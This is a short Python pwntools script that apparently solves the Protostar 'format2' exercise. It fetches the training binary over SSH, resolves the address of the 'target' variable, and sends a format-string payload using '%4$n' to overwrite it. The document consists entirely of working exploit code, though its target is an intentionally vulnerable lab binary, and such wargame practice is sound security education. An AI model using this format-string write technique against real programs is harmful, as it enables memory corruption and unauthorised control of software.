#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/format2'
sh.download(binarypath)
p=sh.run(binarypath)
elf=ELF('./format2')
addr=elf.symbols['target']
amt=64
payload=p32(addr)+"%"+str(amt-4)+"x"+"%4$n"
p.sendline(payload)
p.recvuntil('\n')
print p.recvall()
os.system('rm format2')